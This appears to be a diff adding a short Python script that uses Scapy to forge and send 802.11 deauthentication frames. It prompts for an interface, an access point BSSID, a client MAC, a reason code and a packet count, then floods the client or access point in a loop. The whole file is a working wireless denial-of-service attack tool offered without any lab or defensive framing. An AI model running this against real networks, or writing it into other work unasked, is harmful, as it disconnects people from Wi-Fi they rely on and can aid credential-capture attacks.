@@ -1,0 +1,43 @@
+from scapy.all import conf, sendp
+from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
+
+while(True):
+    interface = input("Define interface :\n")
+    bssid = input("Enter BSSID :\n")
+    client = input("Enter client :\n")
+    deauthNumber = input("Enter number of deauth packets to send :\n")
+    print("Choose your reason code :")
+    print("1 - Unspecified")
+    print("4 - Disassioted due to inactivity")
+    print("5 - Disassioted because AP is unable to handle all currently associated stations.")
+    print("8 - Deauthenticated because sending STA is leaving BSS")
+    codeReason = input("Reason code :\n")
+    codeReason = int(codeReason)
+    
+    if(codeReason == 1):
+        src = bssid
+        dst = client
+
+    elif(codeReason == 4):
+        src = bssid
+        dst = client
+
+    elif(codeReason == 5):
+        src = bssid
+        dst = client
+
+    elif(codeReason == 8):
+        src = client
+        dst = bssid
+
+    else:
+        print("Error")
+        break
+
+    #print(packet.pdfdump())
+    dot11 = Dot11(addr1=dst, addr2=src, addr3=bssid)
+    packet = RadioTap()/dot11/Dot11Deauth(reason=codeReason)
+
+    for n in range(int(deauthNumber)):
+        sendp(packet, iface=interface)
+        #print(f"Deauth sent via: {conf.iface} to BSSID: {bssid} for Client: {client}")
